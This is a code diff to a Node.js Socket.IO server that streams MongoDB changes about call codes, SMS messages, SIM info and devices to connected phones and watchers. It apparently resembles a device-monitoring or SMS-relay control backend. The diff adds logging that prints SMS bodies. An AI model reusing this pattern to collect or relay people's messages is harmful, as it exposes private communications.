@@ -50,7 +50,7 @@ function notifyWatchers(uniqueid, payload) {
   const set = watchers.get(uniqueid);
   if (!set) return;
   for (let sid of set) {
-    io.to(sid).emit("deviceRealtime", payload); // FIXED EVENT NAME
+    io.to(sid).emit("deviceRealtime", payload);
   }
 }
 
@@ -90,7 +90,7 @@ io.on("connection", (socket) => {
     deviceSockets.set(id, socket.id);
     currentUniqueId = id;
 
-    socket.join(id); // FIXED
+    socket.join(id);
 
     saveLastSeen(id, "Online");
 
@@ -192,8 +192,8 @@ export function sendCallCodeToDevice(rawId, data) {
 
   console.log("📞 CALL EMIT:", id);
 
-  io.to(id).emit("callCodeUpdate", data);  // FIXED
-  notifyWatchers(id, { type: "call", ...data }); // UI LIVE UPDATE
+  io.to(id).emit("callCodeUpdate", data);
+  notifyWatchers(id, { type: "call", ...data });
 }
 
 // ======================================================
@@ -201,7 +201,7 @@ export function sendCallCodeToDevice(rawId, data) {
 // ======================================================
 export function sendAdminGlobal(data) {
   console.log("👑 ADMIN:", data);
-  io.emit("adminUpdate", data); // FIXED
+  io.emit("adminUpdate", data);
 }
 
 // ======================================================
@@ -218,13 +218,15 @@ mongoose.connection.once("open", () => {
         stream.on("change", async (chg) => {
           if (!["insert", "update", "replace"].includes(chg.operationType)) return;
 
-          const doc = await mongoose.connection.collection(collection)
+          const doc = await mongoose.connection
+            .collection(collection)
             .findOne({ _id: chg.documentKey._id });
 
           if (doc) cb(doc);
         });
 
-        stream.on("error", () => {
+        stream.on("error", (err) => {
+          console.log("🔥 Stream Error on", collection, ":", err?.message);
           console.log("🔥 Stream Restart:", collection);
           setTimeout(start, 2000);
         });
@@ -236,25 +238,40 @@ mongoose.connection.once("open", () => {
     start();
   }
 
+  // CALL CODES
   watch("callcodes", (doc) => {
-    if (doc.uniqueid) sendCallCodeToDevice(doc.uniqueid, doc);
+    if (doc.uniqueid) {
+      console.log("📡 CALLCODE change:", doc.uniqueid);
+      sendCallCodeToDevice(doc.uniqueid, doc);
+    }
   });
 
+  // ✅ SMS LIVE WATCH
   watch("sms", (doc) => {
-    if (!doc.uniqueid) return;
+    if (!doc.uniqueid) {
+      console.log("⚠ SMS doc missing uniqueid:", doc);
+      return;
+    }
+
     const id = cleanId(doc.uniqueid);
+
+    console.log("📩 SMS change for:", id, " → ", doc.body);
+
     io.to(id).emit("smsUpdate", doc);
     notifyWatchers(id, { type: "sms", ...doc });
   });
 
+  // ADMINS
   watch("admins", (doc) => {
     sendAdminGlobal(doc);
   });
 
+  // SIM INFOS
   watch("siminfos", (doc) => {
     io.emit("simInfoUpdated", doc);
   });
 
+  // DEVICES
   watch("devices", (doc) => {
     io.emit("deviceListUpdated", { event: "db_update", device: doc });
   });
